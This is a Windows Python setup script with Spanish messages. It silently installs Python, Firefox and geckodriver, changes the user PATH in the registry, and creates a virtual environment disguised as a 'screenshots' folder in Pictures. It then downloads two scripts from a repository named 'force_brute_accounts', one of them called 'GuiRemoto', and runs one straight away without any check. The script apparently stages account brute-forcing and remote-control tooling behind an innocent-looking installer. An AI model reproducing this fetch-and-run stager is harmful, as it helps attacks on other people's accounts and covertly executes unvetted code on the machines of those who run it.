import os
import subprocess
import urllib.request
import zipfile
import winreg
import getpass
from shutil import move

def playwright_complemento():
    print('[-] Instalando Complemento De Playwright')
    target_dir = f"C:\\Users\\{getpass.getuser()}\\AppData\\Local\\ms-playwright\\firefox-1449"
    url = 'https://playwright.azureedge.net/builds/firefox/1449/firefox-win64.zip'
    name_tmp = os.path.basename(url)

    os.path.basename(url)  
    urllib.request.urlretrieve(url,url[53:])

    os.makedirs(target_dir, exist_ok=True)
    move(os.path.join(os.getcwd(),url[53:]),target_dir)
    os.chdir(target_dir)
    with zipfile.ZipFile(url[53:], "r") as zip_ref:
        zip_ref.extractall()
    os.remove(name_tmp)

try:

    import selenium
    import PIL
    import playwright
    import ConfigStrem

except Exception:
    print('[-] Instalando librerias falatantes')
    result = subprocess.run(['pip','install','pillow','selenium','playwright'], stdout = subprocess.PIPE, stderr = subprocess.PIPE)
    playwright_complemento()


def check_firefox_installed():
    try:
        # Abrir la clave del registro de Firefox
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Mozilla\Mozilla Firefox")
        
        # Obtener el valor de la versión de Firefox
        value, _ = winreg.QueryValueEx(key, "CurrentVersion")
        
        # Cerrar la clave del registro
        winreg.CloseKey(key)
        
        return True
    except FileNotFoundError:
        return False

def verify(ruta,geckodriver_url,geckodriver_zip):
    os.chdir(ruta)
    urllib.request.urlretrieve(geckodriver_url, geckodriver_zip)
    with zipfile.ZipFile(geckodriver_zip, "r") as zip_ref:
        zip_ref.extractall()
    os.remove(geckodriver_zip)

def install_firefox():
    if check_firefox_installed():
        print("[-] Firefox ya instalado")
    else:
        print("[-]Firefox no está instalado en tu sistema.")
        print("[-] Instalando Firefox...")
        firefox_url = "https://ftp.mozilla.org/pub/firefox/releases/124.0.2/win64/es-ES/Firefox%20Setup%20124.0.2.exe"
        firefox_installer = "Firefox Setup 124.0.2.exe"
        urllib.request.urlretrieve(firefox_url, firefox_installer)
        subprocess.run([firefox_installer, "-ms"])
        os.remove(firefox_installer)
        print("[-] Firefox instalado correctamente.")

def install_geckodriver():

    try:
        cmd = 'geckodriver --version'
        ruta = os.path.join(os.getcwd(),'geckodriver')    
        
        msg = subprocess.run(cmd,stdout= subprocess.PIPE,stderr= subprocess.PIPE)
        reg = msg.stdout.decode()

        if reg.startswith('geckodriver'):
            print('[-] Geckodriver ya Instalado')

    except FileNotFoundError:
        
        print("[-] Descargando geckodriver...")
        geckodriver_url = "https://github.com/mozilla/geckodriver/releases/download/v0.33.0/geckodriver-v0.33.0-win64.zip"
        geckodriver_zip = "geckodriver.zip"

        if os.path.exists(ruta):
            verify(ruta,geckodriver_url,geckodriver_zip)
        else:
            os.mkdir(ruta)
            verify(ruta,geckodriver_url,geckodriver_zip)

        print("[-] Agregando geckodriver a las variables de entorno")

        geckodriver_path = os.path.abspath("geckodriver.exe")

        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Environment", 0, winreg.KEY_ALL_ACCESS)
        path_value = winreg.QueryValueEx(key, "Path")[0]
        new_path_value = path_value + ";" + os.path.dirname(geckodriver_path)
        winreg.SetValueEx(key, "Path", 0, winreg.REG_EXPAND_SZ, new_path_value)
        winreg.CloseKey(key)
        print("[-] geckodriver agregado correctamente a las variables de entorno.")
  
def install_python():
    cmd = 'python --version'
    reg = os.popen(cmd).read().rstrip()
    if reg.startswith('Python'):
        print('[-] python ya instado')

    else:
        print("[-] Instalando Python...")
        python_url = "https://www.python.org/ftp/python/3.12.1/python-3.12.1-amd64.exe"
        python_installer = "python-3.12.1-amd64.exe"
        urllib.request.urlretrieve(python_url, python_installer)
        subprocess.run([python_installer, "/quiet", "InstallAllUsers=1", "PrependPath=1"])
        os.remove(python_installer)
        print("[-] Python instalado correctamente.")
        
def create_virtual_environment():

    pictures_path = os.path.expanduser("~/Pictures")
    screenshots_path = os.path.join(pictures_path, "screenshots")

    if os.path.exists(screenshots_path):
        print('[-] Directorio de entorno virtual ya creado')

    else:
        print("[-] Creando entorno virtual...")
        subprocess.run(["python", "-m", "venv", screenshots_path])
        print("[-] Entorno virtual creado correctamente.")

def activate_virtual_environment():
    pictures_path = os.path.expanduser(r"~\Pictures")
    if os.getcwd() != pictures_path:
        screenshots_path = os.path.join(pictures_path, "screenshots", "Scripts", "activate.bat")
        os.chdir(screenshots_path[:-20])
        subprocess.run([screenshots_path])
        print("[-] Entorno virtual activado.")
    
    if os.path.exists(f'{screenshots_path[:-20]}\\ConfigStrem.py') and os.path.exists(f'{screenshots_path[:-20]}\\GuiRemoto.py'):
        print("[-] Scripts Encontrados ...")
        os.system('python GuiRemoto.py')

    else:
        ConfigStrem = "https://raw.githubusercontent.com/Moubotred/force_brute_accounts/main/Make/ConfigStrem.py"
        GuiRemoto = "https://raw.githubusercontent.com/Moubotred/force_brute_accounts/main/Make/GuiRemoto.py"
        
        urllib.request.urlretrieve(ConfigStrem, ConfigStrem[-14:])
        urllib.request.urlretrieve(GuiRemoto, GuiRemoto[-12:])

        if os.path.exists(f'{screenshots_path[:-20]}\\ConfigStrem.py') and os.path.exists(f'{screenshots_path[:-20]}\\GuiRemoto.py'):
            print("[-] Scripts Decargados ...")
            os.system('python GuiRemoto.py')

def setup():
    install_python()
    install_firefox()
    install_geckodriver()
    create_virtual_environment()
    activate_virtual_environment()

setup()